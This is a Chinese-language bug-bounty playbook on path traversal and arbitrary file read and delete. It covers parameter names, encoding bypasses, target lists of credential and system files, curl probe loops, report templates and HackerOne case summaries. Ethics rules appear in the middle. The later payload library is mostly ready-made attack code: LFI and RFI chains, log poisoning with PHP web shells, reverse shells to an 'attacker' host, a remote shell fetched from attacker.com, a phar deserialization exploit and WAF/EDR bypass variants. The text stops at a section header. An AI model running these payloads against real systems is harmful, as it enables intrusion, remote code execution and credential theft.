# 路径遍历 / 任意文件读 / 任意文件删

> 视角：黑盒，目标是读到不该读的文件 / 删到不该删的文件

## 1. 一句话说清

路径遍历 = 用户控制的文件路径绕过应用的"目录边界"。
最经典：`?file=../../etc/passwd`。
SRC 价值：能读 = P1，读到配置 → DB 密码 → P0；任意文件删 = P0（**易遗漏**）。

---

## 2. 高频入口点

### 2.1 高危参数名（按 wooyun 案例频次）

| 参数 | 出现次数 | 典型场景 |
|------|---------|---------|
| `filename` | 63 | 文件下载 / 附件 |
| `filepath` | 30 | 路径指定 |
| `path` | 20 | 通用路径 |
| `hdfile` | 14 | 特定 CMS |
| `inputFile` | 9 | Resin / Java |
| `file` | 7 | 通用 |
| `url` | 4 | SSRF / 文件读复合 |
| `filePath` | 4 | Java 驼峰 |
| `FileUrl` | 3 | ASP.NET |
| `XFileName` | 3 | 特定 CMS |

### 2.2 参数命名规律

```
通用：file, path, name, url, src, dir, folder
下载：download, down, attachment, attach, doc
读取：read, load, get, fetch, open, input
文件：filename, filepath, fname, fn, resource
模板：template, tpl, page, include, temp
```

复合参数：
```
?path=xxx&name=xxx
?filePath=xxx&fileName=xxx
?FileUrl=xxx&FileName=xxx
?file=xxx&showname=xxx
```

### 2.3 高频漏洞端点 TOP

```
down.php           (20 次)
download.jsp       (17 次)
download.asp       (13 次)
download.php       (7 次)
download.ashx      (7 次)
viewsharenetdisk.php (6 次)
GetPage.ashx       (6 次)
pic.php            (4 次)
openfile.asp       (4 次)
do_download.jsp    (8 次)
```

---

## 3. 探测手法

### 3.1 基础遍历序列

```
../
../../
../../../
../../../../
../../../../../
../../../../../../
```

### 3.2 编码梯度（顺序尝试）

```
../        →  %2e%2e%2f
../        →  %252e%252e%252f                # 双重 URL 编码
../        →  ..%c0%af / ..%c1%9c            # 超长 UTF-8（Tomcat / GlassFish）
../        →  %u002e%u002e%u2215             # 16-bit Unicode（IIS / 旧 Java）
../        →  ....// / ..../                  # 过滤器删一次后剩 ../
../        →  ..%2f%2e / %2e%2e/              # 混合
```

### 3.3 截断 / 协议

```
%00       ../../../etc/passwd%00.jpg       # PHP <5.3.4 / 旧 Java
;         /admin;.jpg                       # IIS / Tomcat
file://   file:///etc/passwd
view-source:  view-source:file:///etc/passwd
php://filter  php://filter/convert.base64-encode/resource=index.php
zip://    zip://archive.zip%23shell.php
data://   data://text/plain,<?php phpinfo();?>
expect:// expect://id
```

### 3.4 路径正则化绕过

```
....//      # 双点斜杠
..../       # 多点
..\..\      # 反斜杠
..\../      # 混合
/./         # 冗余
//          # 双斜杠
/;/         # 分号路径段
```

### 3.5 Base64 / Hex 绕过

```
# Winmail 案例
?filename=Li4vLi4vLi4vLi4vLi4vLi4vd2luZG93cy93aW4uaW5p
（base64 解码 = ../../../../../../windows/win.ini）

# 淘客帝国 CMS
?url=cGljLnBocA==
（base64 = pic.php）
```

### 3.6 敏感文件目标库

#### Linux

```
# 系统账户
/etc/passwd                /etc/shadow
/etc/hosts                 /etc/group
/etc/sudoers               /etc/issue

# SSH
/root/.ssh/authorized_keys     /root/.ssh/id_rsa
/home/{user}/.ssh/authorized_keys
/home/{user}/.ssh/id_rsa

# 历史 / 进程（信息金矿）
/root/.bash_history
/home/{user}/.bash_history
/proc/self/environ          # 含进程启动环境变量（含 secret）
/proc/self/cmdline
/proc/self/fd/{n}
/proc/version               /proc/cpuinfo
/proc/{pid}/environ

# Web 配置
/etc/nginx/nginx.conf
/etc/httpd/conf/httpd.conf
/etc/apache2/apache2.conf
/etc/my.cnf                 /etc/mysql/my.cnf
```

#### Windows

```
C:\windows\win.ini          C:\boot.ini
C:\windows\system32\config\sam
C:\windows\repair\sam
C:\inetpub\wwwroot\web.config
C:\windows\system32\inetsrv\config\applicationHost.config
C:\windows\system32\drivers\etc\hosts
```

#### Java Web

```
/WEB-INF/web.xml
/WEB-INF/classes/jdbc.properties
/WEB-INF/classes/database.properties
/WEB-INF/classes/applicationContext.xml
/WEB-INF/classes/hibernate.cfg.xml
/WEB-INF/classes/application.yml
../WEB-INF/web.xml
../../WEB-INF/web.xml
/../WEB-INF/web.xml%3f
```

#### PHP / 框架

```
/config.php           /config.inc.php
/db.php               /database.php
/conn.php             /common.php
/wp-config.php        # WordPress
/config_global.php    # Discuz
/config_ucenter.php   # Discuz UCenter
/application/config/database.php   # CodeIgniter
/config/database.php  # Laravel
/.env                 /.env.production
```

#### .NET

```
/web.config
/connectionStrings.config
/App_Data/database.mdf
```

### 3.7 探针策略

```bash
# 标准 8-12 层 ../
for i in 1 2 3 4 5 6 7 8 9 10; do
  prefix=$(printf '../%.0s' $(seq 1 $i))
  curl -s "https://target/down.php?file=${prefix}etc/passwd" \
    | grep -q "root:" && echo "Hit: $i levels"
done

# 编码递增
for enc in "../" "..%2f" "%2e%2e%2f" "%252e%252e%252f" "..%c0%af" "....//"; do
  curl -s "https://target/down.php?file=${enc}${enc}${enc}etc/passwd"
done

# Java Web 模式
curl "https://target/download.jsp?path=../WEB-INF/web.xml"
curl "https://target/download.aspx?file=../web.config"
```

---

## 4. Bypass 矩阵

| 拦 | 绕 |
|---|---|
| `../` 字面拦 | URL 编码 / 双重编码 / Unicode 超长 / `....//` / `..\../` |
| 后缀白名单（`.jpg`） | `%00` 截断 / `?file=../../etc/passwd%00.jpg` / `;.jpg` |
| 黑名单 `passwd` | `pas%73wd` / `passwD` / `pas\x73wd`（旧版） |
| 绝对路径拦 | 相对路径 + 多 `../` |
| 多 `../` 拦 | 嵌套：`....//` 删一次后剩 `../` |
| 关键字 `etc` | `EtC` / `e%74c` / 全编码 |
| 仅允许某目录 | 利用规范化差异：`/allowed/../etc/passwd` |
| 长度限制 | 短文件：`/etc/hosts` 比 `/etc/passwd` 短 |

---

## 5. 利用提权 / 横向

```
读到 /etc/passwd → 拿到用户名列表
  ↓
读到 /home/web/.ssh/id_rsa → SSH 私钥（不要使用）
  ↓
读到 application.yml / .env → DB / Redis / API 密钥
  ↓
读到 /proc/self/environ → 启动环境变量（含 secret）
  ↓
读到 /WEB-INF/classes/jdbc.properties → JDBC 连接串

→ SRC 报告时**最好停在"配置文件 + 第一行内容（脱敏）"**
  不要尝试用读到的密钥登录任何服务

# 任意文件删 → 瘫痪服务
DELETE /api/upload?path=../../web/index.html → 首页消失
```

参考 wooyun 案例：
- `?urlParam=../../../WEB-INF/web.xml%3f`（华云数据，配置泄露）
- `upload.aspx?id=8&dir=../../../../`（某家电厂商，目录浏览 + 任意删）
- `down.php?dd=../down.php`（某政府网站，源码下载）
- `IP:8888/../../../etc/shadow`（某大厂内部，shadow 读取）

---

## 6. 真实案例指纹

| 案例 ID | Payload | 结果 |
|--------|---------|------|
| wooyun-华云数据 | `?urlParam=../../../WEB-INF/web.xml%3f` | 配置泄露 |
| wooyun-某家电 | `upload.aspx?id=8&dir=../../../../` | 目录浏览 + 任意删 |
| wooyun-某政府 | `down.php?dd=../down.php` | 源码下载 |
| wooyun-上海海事 | `/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/.../etc/passwd` | UTF-8 超长（GlassFish） |
| Resin | `/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd` | 绝对路径 |
| Winmail | `?filename={base64 of ../../../windows/win.ini}` | base64 绕过 |
| 淘客帝国 | `pic.php?url=cGljLnBocA==` | base64 |

通用指纹：

- 响应中 `root:x:0:0:root:/root:/bin/bash` → 命中 /etc/passwd
- 响应中 `[boot loader]` 或 `[fonts]` → win.ini
- 响应中 `<?xml version="1.0"` + `<web-app` → web.xml
- 响应中 `connectionString=` → web.config
- 响应中 `;application.properties` 字段 → Spring Boot 配置

---

## 7. 复现 / 证据要点

### 7.1 报告必备

1. 完整请求 URL
2. 响应状态 + 关键内容
3. 读到的文件第一行 / 关键标记字段（**脱敏**）
4. 影响升级链（如能读到 DB 密码，但不实际利用）

### 7.2 PoC 模板

```http
GET /download.php?file=../../../../etc/passwd HTTP/1.1
Host: target.com

HTTP/1.1 200 OK
Content-Type: application/octet-stream

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
... (前 5 行作证，其余脱敏)
```

### 7.3 配置文件类（高价值，必脱敏）

```http
GET /download?file=../../config/application-prod.yml HTTP/1.1
...

HTTP/1.1 200 OK

spring:
  datasource:
    url: jdbc:mysql://10.0.x.x:3306/****
    username: ****
    password: M****d!（13 位）
    driver-class-name: com.mysql.cj.jdbc.Driver
  redis:
    host: 10.0.x.x
    password: r****x（10 位）

我已停止在"读取该配置"步骤，未尝试连接任何凭据。
完整文件 sha256: abc123...（证明拿到原文）
```

### 7.4 CVSS

```
任意文件读（含敏感）  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N = 7.5
仅读公开内容          CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N = 5.3
读到 DB 配置 → 链 P0 = 9.8
任意文件删            CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H = 8.6
任意文件覆盖（webroot） CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8
```

### 7.5 影响段

```
通过 /download.php 接口的 file 参数，攻击者可使用 ../ 序列读取
任意文件。已确认可读：
1. /etc/passwd（系统用户列表）
2. /var/www/html/config/application-prod.yml（DB / Redis 凭据）
3. /proc/self/environ（启动环境变量）

最严重链路：
  任意文件读 → application-prod.yml → MySQL 密码 → 直连数据库
（我已停止在"读到 yml"步骤，未尝试连接 DB）

测试 5 次，复现率 100%。
```

---

## 8. 不要做的事

- **禁**：用读到的 SSH 私钥 / DB 密码登录任何服务。
- **禁**：读取 `/etc/shadow`（即使能读，也会被怀疑越线）。仅做"探测能力"证明，看到 `root:x:` 行即停。
- **禁**：批量读取多个用户的 `.bash_history` / `.aws/credentials`。仅证明 1 个 sample。
- **禁**：尝试任意文件删除真实生产文件（`index.html`、`.htaccess`）。在测试环境验证 / 在受影响目录创建一个 PoC 文件再删它。
- **禁**：把读到的源码 / 配置上传到 GitHub / 第三方仓库。本地保存，报告后删除。
- **报告中**：源码 / 配置必须脱敏。可附 sha256 hash 证明拿到过原文。

## H1 真实案例

_共 163 份 HackerOne 已披露 High/Critical 报告命中本类，按 (赏金 + 投票×100) 排序取 Top 12_

| Severity | $ | 程序 | 标题（点击看原报告） | 摘要 |
|---|--:|---|---|---|
| Critical | 20000 usd | GitLab | [Arbitrary file read via the UploadsRewriter when moving and issue](https://hackerone.com/reports/827052) | Summary The `UploadsRewriter` does not validate the file name, allowing arbitrary files to be copied via directory traversal wh… |
| Critical | 29000 usd | GitLab | [Arbitrary file read  via the bulk imports UploadsPipeline](https://hackerone.com/reports/1439593) | Summary The bulk imports api does not remove symlinks when untaring the uploads.tar.gz file, allowing arbitrary files to be rea… |
| Critical | 16000 usd | GitLab | [Arbitrary file read during project import](https://hackerone.com/reports/1132378) | NOTE! Thanks for submitting a report! Please replace *all* the (parenthesized) sections below with the pertinent details. Remem… |
| Critical | — | Starbucks | [Misuse of an authentication cookie combined with a path traversal on app.starbucks.com permitted …](https://hackerone.com/reports/876295) | Misuse of an authentication cookie combined with a path traversal on app.starbucks.com permitted access to restricted data |
| High | 6000 usd | Mozilla | [Mozilla VPN Clients: RCE via file write and path traversal](https://hackerone.com/reports/2995025) | Summary: Hi! I decided to have another look at the Mozilla VPN Client, after #2920675 was set to resolved. When going over all … |
| High | 12000 usd | GitLab | [Path traversal in Nuget Package Registry](https://hackerone.com/reports/822262) | Summary There's a path traversal issue in Nuget package registry which was released to GitLab-EE recently |
| High | — | LY Corporation | [Path traversal in filename in LINE Mac client](https://hackerone.com/reports/727727) | Path traversal in filename in LINE Mac client |
| Critical | — | WordPress | [RCE as Admin defeats WordPress hardening and file permissions](https://hackerone.com/reports/436928) | This vulnerability was found when I found myself in the following scenario: My collegue set up WordPress on his local machine a… |
| High | — | PortSwigger Web Security | [[portswigger.net] Path Traversal al /cms/audioitems](https://hackerone.com/reports/2424815) | Prelude. I wasn't going to report it, I thought it was your laboratory but after my first analysis this seems real. Description… |
| Critical | 4000 usd | Internet Bug Bounty | [Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49](https://hackerone.com/reports/1394916) | A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49 |
| High | — | Lichess | [Path Traversal Vulnerability in Lila Project](https://hackerone.com/reports/3181066) | Summary: A path traversal vulnerability was discovered in the Lila project that allows an attacker to access arbitrary files on… |
| High | 1000 usd | Aiven Ltd | [Zero day path traversal vulnerability in Grafana 8.x allows unauthenticated arbitrary local file …](https://hackerone.com/reports/1415820) | Summary: Hi team, I've found a path traversal issue in the Grafana instances hosted on the Aiven platforms |

**命中本类的 weakness 分布：**

- Path Traversal：144 条
- Uncategorized → 手工归类：7 条
- Path Traversal: '.../...//'：5 条
- Relative Path Traversal：2 条
- External Control of File Name or Path：1 条
- File Manipulation：1 条
- PHP Local File Inclusion：1 条
- Untrusted Search Path：1 条
- Insecure Temporary File：1 条


## Payload 库

_12 个结构化 web payload，含完整攻击链 + WAF/EDR 绕过变体_

### 本地文件包含  `lfi-basic`
本地文件包含漏洞利用技术
子类：**本地包含** · tags: `lfi` `local` `file` `inclusion`

**前置条件：** 存在文件包含功能；用户可控制包含路径

**攻击链：**

**1. 1. 探测LFI**
_探测本地文件包含_
```
?file=../../../etc/passwd
?file=....//....//....//etc/passwd
?file=..\..\..\windows\win.ini
?page=php://filter/convert.base64-encode/resource=index.php
```

**2. 2. 读取敏感文件**  _[linux]_
_读取Linux敏感文件_
```
../../../etc/passwd
../../../etc/shadow
../../../var/log/apache2/access.log
../../../proc/self/environ
../../../proc/self/cmdline
```

**3. 3. PHP伪协议**
_使用PHP伪协议_
```
php://filter/convert.base64-encode/resource=config.php
php://input (POST数据作为输入)
php://data://text/plain,<?php phpinfo();?>
phar://archive.zip/shell.php
```

**4. 4. 日志投毒**  _[linux]_
_通过日志投毒获取RCE_
```
1. 包含日志文件: ../../../var/log/apache2/access.log
2. 在User-Agent中注入: <?php system($_GET['c']); ?>
3. 访问: ?file=../../../var/log/apache2/access.log&c=id
```

**WAF/EDR 绕过变体：**

**1. 目录遍历绕过**
_绕过目录遍历过滤_
```
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
....\/....\/....\/etc/passwd
```

**2. 后缀绕过**
_绕过文件后缀检查_
```
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd/.jpg
php://filter/convert.base64-encode/resource=config.php%00
```

---

### 远程文件包含  `rfi-basic`
远程文件包含漏洞利用技术
子类：**远程包含** · tags: `rfi` `remote` `file` `inclusion`

**前置条件：** 存在文件包含功能；allow_url_include=On；用户可控制包含路径

**攻击链：**

**1. 1. 探测RFI**
_探测远程文件包含_
```
?file=http://attacker.com/shell.txt
?file=http://attacker.com/shell.txt%00
?file=http://attacker.com/shell.txt?
```

**2. 2. 托管恶意文件**
_托管恶意文件并执行_
```
# shell.txt内容
<?php system($_GET['cmd']); ?>

# 访问
?file=http://attacker.com/shell.txt&cmd=id
```

**3. 3. 反弹Shell**  _[linux]_
_获取反弹Shell_
```
# shell.txt内容
<?php system("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\""); ?>

# 或使用
<?php $sock=fsockopen("attacker",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

**4. 4. 使用data协议**
_使用data协议执行代码_
```
?file=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=id
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

**WAF/EDR 绕过变体：**

**1. 双写绕过**
_双写绕过关键字过滤_
```
?file=htthttp://p://attacker.com/shell.txt
?file=http://attackerattacker.com.com/shell.txt
```

**2. 大小写混淆**
_大小写混淆绕过_
```
?file=HtTp://attacker.com/shell.txt
?file=HTTP://attacker.com/shell.txt
```

**3. 协议替换**
_使用其他协议_
```
?file=ftp://attacker.com/shell.txt
?file=php://filter/convert.base64-encode/resource=http://attacker.com/shell.txt
```

---

### 日志投毒LFI  `lfi-log-poison`
通过日志投毒实现LFI到RCE
子类：**日志投毒** · tags: `lfi` `log` `poison` `rce`

**前置条件：** 存在LFI漏洞；可包含日志文件；日志文件可写

**攻击链：**

**1. 1. 探测日志文件位置**  _[linux]_
_探测日志文件位置_
```
# Apache日志
../../../var/log/apache2/access.log
../../../var/log/apache2/error.log
../../../var/log/httpd/access_log
../../../var/log/nginx/access.log

# 系统日志
../../../var/log/auth.log
../../../var/log/syslog
```

**2. 2. 投毒User-Agent**
_在User-Agent中注入代码_
```
# 使用curl投毒
curl -A "<?php system($_GET['c']); ?>" http://target.com/

# 或使用Burp Suite修改User-Agent
User-Agent: <?php system($_GET['c']); ?>
```

**3. 3. 投毒请求路径**
_在请求路径中注入代码_
```
# 在URL路径中注入
curl http://target.com/<?php system($_GET['c']); ?>

# URL编码
curl http://target.com/%3C%3Fphp%20system%28%24_GET%5B%27c%27%5D%29%3B%20%3F%3E
```

**4. 4. 执行命令**  _[linux]_
_包含日志文件执行命令_
```
# 包含日志文件并执行命令
?file=../../../var/log/apache2/access.log&c=id
?file=../../../var/log/apache2/access.log&c=whoami
?file=../../../var/log/apache2/access.log&c=cat /etc/passwd
```

**5. 5. 反弹Shell**  _[linux]_
_获取反弹Shell_
```
?file=../../../var/log/apache2/access.log&c=bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"
```

**WAF/EDR 绕过变体：**

**1. 编码绕过**
_WAF绕过技术_
```
# 使用Base64编码
<?php eval(base64_decode($_GET['c'])); ?>
# 然后传递Base64编码的命令
```

---

### PHP伪协议利用  `lfi-wrapper`
利用PHP伪协议进行LFI攻击
子类：**伪协议** · tags: `lfi` `wrapper` `php` `protocol`

**前置条件：** 存在LFI漏洞；PHP环境；伪协议未禁用

**攻击链：**

**1. 1. php://filter**
_使用php://filter读取源码_
```
# 读取源码(Base64)
?file=php://filter/convert.base64-encode/resource=config.php

# 读取源码(Rot13)
?file=php://filter/read=string.rot13/resource=config.php

# 多重过滤器
?file=php://filter/convert.base64-encode|string.rot13/resource=config.php
```

**2. 2. php://input**
_使用php://input执行代码_
```
# POST执行PHP代码
?file=php://input
POST: <?php system('id'); ?>

# 执行任意代码
POST: <?php phpinfo(); ?>
POST: <?php echo file_get_contents('/etc/passwd'); ?>
```

**3. 3. data://协议**
_使用data://协议执行代码_
```
# 直接执行代码
?file=data://text/plain,<?php system('id'); ?>

# Base64编码
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# 执行任意命令
?file=data://text/plain,<?php system($_GET['c']); ?>&c=id
```

**4. 4. phar://协议**
_使用phar://协议_
```
# 创建phar文件
<?php
$p = new Phar('shell.phar');
$p->addFromString('shell.txt', '<?php system($_GET["c"]); ?>');
?>

# 包含phar
?file=phar://shell.phar/shell.txt&c=id
```

**5. 5. zip://协议**
_使用zip://协议_
```
# 创建zip文件
zip shell.zip shell.txt
# shell.txt内容: <?php system($_GET['c']); ?>

# 包含zip
?file=zip://shell.zip%23shell.txt&c=id

# 使用jpg+zip
copy shell.jpg+shell.zip shell.jpg
?file=zip://shell.jpg%23shell.txt&c=id
```

**WAF/EDR 绕过变体：**

**1. 大小写混淆**
_大小写混淆绕过_
```
?file=Php://filter/convert.base64-encode/resource=config.php
?file=DATA://text/plain,<?php system('id'); ?>
```

**2. 双重URL编码**
_双重URL编码绕过_
```
?file=php%3A%2F%2Ffilter/convert.base64-encode/resource=config.php
?file=%70%68%70%3a%2f%2finput
```

---

### 目录遍历技术  `lfi-traversal`
LFI目录遍历绕过技术
子类：**目录遍历** · tags: `lfi` `traversal` `bypass` `path`

**前置条件：** 存在LFI漏洞；存在路径过滤

**攻击链：**

**1. 1. 基础遍历**
_基础目录遍历_
```
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
..\..\..\windows\win.ini
```

**2. 2. 绕过删除../**
_绕过删除../的过滤_
```
....//....//....//etc/passwd
....//....//etc/passwd
..././..././..././etc/passwd
```

**3. 3. URL编码绕过**
_URL编码绕过_
```
..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

**4. 4. Unicode编码绕过**
_Unicode编码绕过_
```
..%c0%af..%c0%af..%c0%afetc/passwd
..%c1%9c..%c1%9c..%c1%9cwindows\win.ini
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
```

**5. 5. 绝对路径绕过**
_使用绝对路径_
```
/etc/passwd
/etc/shadow
/var/log/apache2/access.log
C:/windows/win.ini
C:\windows\system32\config\sam
```

**WAF/EDR 绕过变体：**

**1. 混合编码**
_混合编码绕过_
```
..%2f..%c0%af..%2fetc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

**2. 空字节截断**
_空字节截断绕过后缀_
```
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd%00.html
```

**3. 点号截断(Windows)**  _[windows]_
_Windows点号截断_
```
../../../windows/win.ini.
../../../windows/win.ini...
../../../boot.ini……
```

---

### PHP Filter链攻击  `lfi-php-filter`
利用PHP Filter链进行LFI攻击
子类：**PHP Filter** · tags: `lfi` `php` `filter` `chain`

**前置条件：** 存在LFI漏洞；PHP环境；filter伪协议可用

**攻击链：**

**1. 1. 读取源码**
_使用Filter读取源码_
```
# Base64编码读取
?file=php://filter/convert.base64-encode/resource=index.php

# Rot13读取
?file=php://filter/read=string.rot13/resource=index.php

# 字符转换
?file=php://filter/read=string.toupper/resource=index.php
```

**2. 2. 多重过滤器**
_使用多重过滤器_
```
# 多重编码
?file=php://filter/convert.base64-encode|string.rot13/resource=config.php

# 去除PHP标签
?file=php://filter/read=string.strip_tags/resource=index.php
```

**3. 3. Filter链RCE**
_使用高级过滤器_
```
# 使用iconv过滤器
?file=php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php

# 使用zlib压缩
?file=php://filter/zlib.deflate/resource=index.php
?file=php://filter/zlib.inflate/resource=data
```

**4. 4. 读取配置文件**
_读取常见框架配置_
```
# WordPress配置
?file=php://filter/convert.base64-encode/resource=wp-config.php

# Laravel .env
?file=php://filter/convert.base64-encode/resource=../.env

# ThinkPHP配置
?file=php://filter/convert.base64-encode/resource=application/database.php
```

**WAF/EDR 绕过变体：**

**1. 大小写混淆**
_大小写混淆绕过_
```
?file=PHP://FILTER/CONVERT.BASE64-ENCODE/RESOURCE=config.php
?file=PhP://FiLtEr/convert.base64-encode/resource=config.php
```

**2. 编码绕过**
_URL编码绕过_
```
?file=%70%68%70%3a%2f%2f%66%69%6c%74%65%72/convert.base64-encode/resource=config.php
```

---

### PHP Input执行  `lfi-php-input`
利用php://input执行PHP代码
子类：**PHP Input** · tags: `lfi` `php` `input` `rce`

**前置条件：** 存在LFI漏洞；allow_url_include=On；POST方法可用

**攻击链：**

**1. 1. 基础执行**
_使用php://input执行代码_
```
# GET请求
GET ?file=php://input

# POST数据
POST: <?php system('id'); ?>
POST: <?php echo 'Hello'; ?>
```

**2. 2. 命令执行**
_执行系统命令_
```
# 执行系统命令
POST: <?php system($_GET['c']); ?>
# 然后访问: ?file=php://input&c=id

# 使用exec
POST: <?php echo exec('id'); ?>

# 使用shell_exec
POST: <?php echo shell_exec('id'); ?>
```

**3. 3. 文件操作**
_文件操作_
```
# 读取文件
POST: <?php echo file_get_contents('/etc/passwd'); ?>

# 写入文件
POST: <?php file_put_contents('shell.php', '<?php system($_GET["c"]); ?>'); ?>

# 列出目录
POST: <?php print_r(scandir('.')); ?>
```

**4. 4. 反弹Shell**  _[linux]_
_获取反弹Shell_
```
POST: <?php system("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\""); ?>

# 或使用
POST: <?php $sock=fsockopen("attacker",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

**WAF/EDR 绕过变体：**

**1. 编码绕过**
_使用编码绕过_
```
# Base64编码
POST: <?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjJ10pOw==')); ?>
# 解码后: system($_GET['c']);

# Rot13编码
POST: <?php eval(str_rot13('flfgrz($_TRG['p']);')); ?>
```

**2. 短标签**
_WAF绕过技术_
```
POST: <?=system($_GET['c']);?>
POST: <?=`$_GET[c]`?>
```

---

### PHP Data协议攻击  `lfi-php-data`
利用data://协议执行PHP代码
子类：**PHP Data** · tags: `lfi` `php` `data` `protocol`

**前置条件：** 存在LFI漏洞；allow_url_include=On；data协议可用

**攻击链：**

**1. 1. 基础执行**
_使用data://协议执行代码_
```
# 直接执行
?file=data://text/plain,<?php system('id'); ?>

# 执行phpinfo
?file=data://text/plain,<?php phpinfo(); ?>

# 输出文本
?file=data://text/plain,Hello World
```

**2. 2. Base64编码**
_使用Base64编码_
```
# Base64编码执行
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
# 解码后: <?php system('id'); ?>

# 带参数执行
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id
```

**3. 3. 命令执行**
_执行系统命令_
```
# 交互式命令
?file=data://text/plain,<?php system($_GET['c']); ?>&c=id
?file=data://text/plain,<?php system($_GET['c']); ?>&c=whoami
?file=data://text/plain,<?php system($_GET['c']); ?>&c=cat /etc/passwd
```

**4. 4. 反弹Shell**  _[linux]_
_获取反弹Shell_
```
?file=data://text/plain,<?php system("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\""); ?>

# Base64版本
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJiYXNoIC1jIFwiYmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci80NDQ0IDA+JjFcIiIpOyA/Pg==
```

**WAF/EDR 绕过变体：**

**1. 大小写混淆**
_大小写混淆绕过_
```
?file=DATA://TEXT/PLAIN,<?php system('id'); ?>
?file=Data://Text/Plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

**2. URL编码**
_URL编码绕过_
```
?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%69%64%27%29%3b%20%3f%3e
```

**3. MIME类型变换**
_变换MIME类型_
```
?file=data://text/html,<?php system('id'); ?>
?file=data://application/x-httpd-php,<?php system('id'); ?>
```

---

### PHP Zip协议攻击  `lfi-php-zip`
利用zip://协议进行LFI攻击
子类：**PHP Zip** · tags: `lfi` `php` `zip` `archive`

**前置条件：** 存在LFI漏洞；可上传zip文件；zip协议可用

**攻击链：**

**1. 1. 创建恶意Zip**
_创建恶意Zip文件_
```
# 创建shell.txt
echo '<?php system($_GET["c"]); ?>' > shell.txt

# 创建zip文件
zip shell.zip shell.txt

# 或使用Python
import zipfile
with zipfile.ZipFile('shell.zip', 'w') as z:
    z.writestr('shell.txt', '<?php system($_GET["c"]); ?>')
```

**2. 2. 上传Zip文件**
_上传Zip文件_
```
# 通过文件上传功能上传shell.zip
# 或通过其他方式上传

# 记住上传路径
/uploads/shell.zip
```

**3. 3. 包含Zip文件**
_包含Zip文件执行代码_
```
# 使用zip://协议包含
?file=zip://uploads/shell.zip%23shell.txt&c=id

# %23是#的URL编码
# 格式: zip://路径#文件名
```

**4. 4. 图片马**
_使用图片马上传_
```
# 创建图片马
copy image.jpg+shell.zip image.jpg

# 或使用
cat image.jpg shell.zip > image.jpg

# 包含
?file=zip://uploads/image.jpg%23shell.txt&c=id
```

**WAF/EDR 绕过变体：**

**1. 使用phar://**
_使用phar://协议_
```
?file=phar://uploads/shell.zip/shell.txt&c=id
# phar://也可以访问zip文件
```

**2. 压缩包嵌套**
_压缩包嵌套绕过_
```
# 在zip中嵌套zip
zip inner.zip shell.txt
zip outer.zip inner.zip

# 包含
?file=zip://outer.zip%23inner.zip%23shell.txt&c=id
```

---

### Phar反序列化攻击  `lfi-phar`
利用Phar反序列化进行RCE
子类：**Phar反序列化** · tags: `lfi` `phar` `deserialization` `rce`

**前置条件：** 存在LFI漏洞；PHP环境；phar扩展可用

**攻击链：**

**1. 1. 创建Phar文件**
_创建恶意Phar文件_
```
# 创建恶意Phar
<?php
class Exploit {
    function __destruct() {
        system($_GET['c']);
    }
}

$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$o = new Exploit();
$phar->setMetadata($o);
$phar->stopBuffering();
?>
```

**2. 2. 触发反序列化**
_触发Phar反序列化_
```
# 通过file_exists触发
?file=phar://exploit.phar&c=id

# 通过file_get_contents触发
?file=phar://exploit.phar/test.txt&c=id

# 通过include触发
?file=phar://exploit.phar&c=id
```

**3. 3. 图片马Phar**
_使用图片马Phar_
```
# 创建图片Phar
copy exploit.phar exploit.gif

# 或添加GIF头
cp exploit.phar exploit.gif

# 触发
?file=phar://uploads/exploit.gif&c=id
```

**4. 4. 常见Gadget链**
_使用常见Gadget链_
```
# Laravel POP链
# Symfony POP链
# WordPress POP链
# ThinkPHP POP链

# 使用phpggc生成
git clone https://github.com/ambionics/phpggc
php phpggc Laravel/RCE1 system id > exploit.phar
```

**WAF/EDR 绕过变体：**

**1. Base64编码**
_Base64编码绕过_
```
# 将Phar内容Base64编码
# 然后解码触发
```

**2. 伪协议组合**
_伪协议组合_
```
?file=php://filter/convert.base64-encode/resource=phar://exploit.phar
# 组合使用
```

---

### Session文件包含  `lfi-session`
利用Session文件进行LFI攻击
子类：**Session包含** · tags: `lfi` `session` `file` `inclusion`

